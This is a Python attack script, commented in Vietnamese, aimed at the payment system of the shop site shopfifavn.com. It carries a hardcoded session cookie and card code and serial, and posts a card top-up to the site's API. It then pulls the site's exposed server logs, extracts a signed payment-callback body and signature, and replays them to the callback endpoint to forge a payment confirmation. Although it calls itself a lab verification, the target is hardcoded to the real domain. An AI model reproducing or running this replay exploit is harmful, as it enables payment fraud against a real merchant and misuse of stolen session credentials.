# -*- coding: utf-8 -*-
import ast
import json
import re
import time
import random
import tempfile
import urllib.error
import urllib.parse
import urllib.request
from datetime import date
from pathlib import Path

import requests

# ============================ CẤU HÌNH ============================
DEFAULT_BASE = "https://shopfifavn.com"
ENDPOINT = "/api/payment/callback"
BALANCE_PATH = "/demo/balance"
TIMEOUT = 10

# Danh sách field chuẩn (parser sẽ tự động strip khoảng trắng thừa ở key từ log)
BODY_FIELDS = [
    "status", "message", "telco", "cardcode", "cardseri", "amount", "amoureal",
    "refcode", "id_tran", "creadate", "lastdate", "callok", "amourequ",
    "discount", "amoudisc", "simnumb", "mobile", "serv_discount"
]

HEX32 = r"[0-9a-fA-F]{32}"

COOKIE = (
    "_gid=GA1.2.1677081516.1794027937; "
    "user_auth=3pJK3U8JJL93XpBsi%2B%2BXS%2BwKYJaa3huXm5GDybelEcdxJmeg2vwl3fDEg5%2BpYzM17hjHA4Xvzb8FQ5N0tjznOhCbnyjWgbyheyR%2FGdGuSBKWppmTN1GtyAt7K8IH4eAu8kkARO8qMJGMlIDm6sK4h23VBCt9LbaXf%2FwlOTTTO0WQVTKxKAA4nEC%2F10%2BKgVqRTlPTlJ6uRglJ52hjP9dRkcRlDUk1XIaGPjN1tJzodU0wja6%2F2TS37eSKsjTi%2Bq%2BEDYCbVRErJpFrcKIW6GbKpiII; "
    "ci_session=5nnesvgqh3ng86opgf0dr207h0puv6jq; "
    "_ga_0282Y54WLE=GS2.1.s1794027937$o1$g1$t1794041524$j2$l0$h0; "
    "_ga=GA1.2.26305963.1794027937; "
    "_ga_N6CVVYLKVT=GS2.2.s1794027937$o1$g1$t1794041524$j3$l0$h0"
)

API_URL = "https://shopfifavn.com/api/payment/mobile"
REFERER = "https://shopfifavn.com/account/add_funds/"
TELCO = "MOBI"
AMOUNT = 1000000
CARDCODE = "366754597216"
CARDSERI = "366319000006226"
TIMEOUT_REQ = 30

# ============================ HÀM NẠP THẺ ============================
def parse_cookies(cookie_str: str) -> dict:
    jar = {}
    for item in cookie_str.split(";"):
        if "=" in item:
            key, value = item.strip().split("=", 1)
            jar[key] = value
    return jar

def build_callback() -> str:
    return f"jQuery351{random.randint(1000, 9999)}_{int(time.time() * 1000)}"

def parse_jsonp(text: str):
    m = re.search(r"(\{.*\})\s*;?\s*$", text, re.S)
    if m:
        return json.loads(m.group(1))
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        return {"raw_response": text}

def build_session() -> requests.Session:
    sess = requests.Session()
    sess.headers.update({
        "accept": "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://shopfifavn.com",
        "pragma": "no-cache",
        "referer": REFERER,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    })
    sess.cookies.update(parse_cookies(COOKIE))
    return sess

def submit_card(telco=TELCO, amount=AMOUNT, cardcode=CARDCODE, cardseri=CARDSERI) -> dict:
    sess = build_session()
    params = {"callback": build_callback()}
    payload = {"telco": telco, "amount": str(amount), "cardcode": cardcode, "cardseri": cardseri}
    resp = sess.post(API_URL, params=params, data=payload, timeout=TIMEOUT_REQ)
    resp.raise_for_status()
    return parse_jsonp(resp.text)

# ============================ REGEX & PARSING ============================
SIGN_RE = re.compile(
    rf'(?<![A-Za-z0-9_])["\']?(?:sign_in|sign)\s*["\']?\s*[:=]\s*["\']?\s*({HEX32})\s*["\']?(?![0-9a-fA-F])',
    re.IGNORECASE,
)
BLOCK_RE = re.compile(r"\{[^{}]*\}")

def _parse_obj(raw: str):
    try:
        obj = json.loads(raw)
    except json.JSONDecodeError:
        try:
            obj = ast.literal_eval(raw)
        except (ValueError, SyntaxError):
            return None
    if isinstance(obj, dict):
        return {k.strip() if isinstance(k, str) else str(k):
                v.strip() if isinstance(v, str) else v for k, v in obj.items()}
    return None

def extract_oracle_pair(text: str):
    best_body, best_oracle = {}, None

    # 1. Ưu tiên tìm trong các khối JSON {...}
    spans = [m.span() for m in BLOCK_RE.finditer(text)]
    for idx, (s, e) in enumerate(spans):
        obj = _parse_obj(text[s:e])
        if not isinstance(obj, dict):
            continue

        fields = {k: v for k, v in obj.items() if k in BODY_FIELDS and v not in (None, "")}
        if not fields:
            continue

        # Kiểm tra chữ ký ngay bên trong khối JSON
        oracle = obj.get("sign_in") or obj.get("sign")
        if isinstance(oracle, str) and re.match(r"^[0-9a-fA-F]{32}$", oracle):
            best_body, best_oracle = fields, oracle.lower()
            break

        # Fallback: tìm chữ ký ngay sau khối JSON
        tail_end = spans[idx + 1][0] if idx + 1 < len(spans) else len(text)
        mo = SIGN_RE.search(text[e:tail_end])
        if mo:
            best_body, best_oracle = fields, mo.group(1).lower()
            break

    # 2. Nếu không tìm thấy khối JSON hợp lệ, thử parse dòng raw_body dạng form-encoded
    if not best_oracle:
        form_pattern = re.compile(r"raw_body=([^\n]+)")
        for match in form_pattern.finditer(text):
            raw = match.group(1)
            try:
                parsed = urllib.parse.parse_qs(raw)
                clean_obj = {k: v[0] if len(v) == 1 else v for k, v in parsed.items()}
                fields = {k: v for k, v in clean_obj.items() if k in BODY_FIELDS and v not in (None, "")}
                if fields:
                    oracle = clean_obj.get("sign_in") or clean_obj.get("sign")
                    if isinstance(oracle, str) and re.match(r"^[0-9a-fA-F]{32}$", oracle):
                        best_body, best_oracle = fields, oracle.lower()
                        break
            except Exception:
                continue

    # Chuẩn hóa kiểu dữ liệu amount
    if "amount" in best_body and isinstance(best_body["amount"], str):
        try:
            best_body["amount"] = int(best_body["amount"].strip().strip('"\''))
        except ValueError:
            pass

    return best_body, best_oracle

# ============================ TÌM LOG (CỤC BỘ + REMOTE URL) ============================
def find_log_files(root_dir=None):
    root = Path(root_dir) if root_dir else Path.cwd()
    candidates = []

    # 1. Tìm log cục bộ
    for base in dict.fromkeys([Path.cwd(), root]):
        wl = base / "writable_logs"
        if wl.is_dir():
            candidates.extend(sorted(wl.glob("log-*.log")))

    # 2. Tìm log từ remote URL (giữ nguyên logic như yêu cầu)
    urls = [
        "https://shopfifavn.com",
        f"https://shopfifavn.com/writable/logs/log-{date.today():%Y-%m-%d}.log",
        "https://shopfifavn.com/writable/logs/log-2026-11-08.log",
    ]
    for url in dict.fromkeys(urls):
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                filename = url.split("/")[-1]
                if not filename or filename == "writable":
                    filename = "log-remote.log"
                temp_log = Path(tempfile.gettempdir()) / filename
                temp_log.write_bytes(resp.read())
                candidates.append(temp_log)
        except Exception:
            pass  # Bỏ qua nếu URL không tồn tại hoặc lỗi mạng

    # 3. Loại bỏ trùng lặp
    seen, logs = set(), []
    for p in candidates:
        p = Path(p)
        try:
            if not p.is_file():
                continue
            rp = p.resolve()
        except OSError:
            continue
        if rp not in seen:
            seen.add(rp)
            logs.append(p)
    return logs

# ============================ HTTP HELPERS ============================
def post(base: str, body: dict):
    data = json.dumps(body, ensure_ascii=False).encode("utf-8")
    req = urllib.request.Request(
        base + ENDPOINT, data=data,
        headers={"Content-Type": "application/json; charset=utf-8", "User-Agent": "lab-verify/1.0"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")

def get(base: str, path: str):
    try:
        with urllib.request.urlopen(base + path, timeout=TIMEOUT) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")

# ============================ MAIN ============================
def main_replay(base: str) -> None:
    print(f"TARGET : {base}")

    logs = find_log_files()
    if not logs:
        print("LOG    : không thấy log lab nào (writable_logs/ hoặc remote URL)")
        return

    text = "\n".join(p.read_text(encoding="utf-8", errors="replace") for p in logs)
    body, sign = extract_oracle_pair(text)

    print(f"ORACLE : log={logs[-1].name}")
    print(f"       : body bóc được ({len(body)} field) = {json.dumps(body, ensure_ascii=False)}")
    print(f"       : sign_in SERVER in ra = {sign or '(không có — oracle đã bị vá?)'}")

    if not sign or not body:
        print("KẾT QUẢ: không có oracle → không replay được (đây là điều bản vá phải đảm bảo)")
        return

    replay = {**body, "sign": sign}
    st, resp = post(base, replay)
    print(f"REPLAY : HTTP {st} → {resp[:200]}")


# ============================ KHỞI CHẠY HARDCODE (KHÔNG DÙNG ARGPARSE) ============================
if __name__ == "__main__":
    TARGET_BASE = "https://shopfifavn.com"
    print(f"▶ Đang chạy chế độ Hardcode với TARGET_BASE: {TARGET_BASE}\n")
    main_replay(TARGET_BASE)
